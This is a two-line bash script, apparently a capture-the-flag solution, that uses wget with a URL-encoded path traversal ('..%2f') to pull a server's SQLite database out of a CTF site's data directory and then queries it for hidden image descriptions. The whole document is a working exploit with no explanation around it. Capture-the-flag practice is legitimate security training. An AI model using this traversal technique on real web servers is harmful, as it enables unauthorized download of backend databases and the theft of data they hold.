#!/bin/bash

wget -O /tmp/db.sqlite3 "https://cat.ctf.ptr.si/data/..%2fdatabase.sqlite3"
cat /dev/null | sqlite3 -cmd "SELECT description FROM images WHERE hidden" /tmp/db.sqlite3
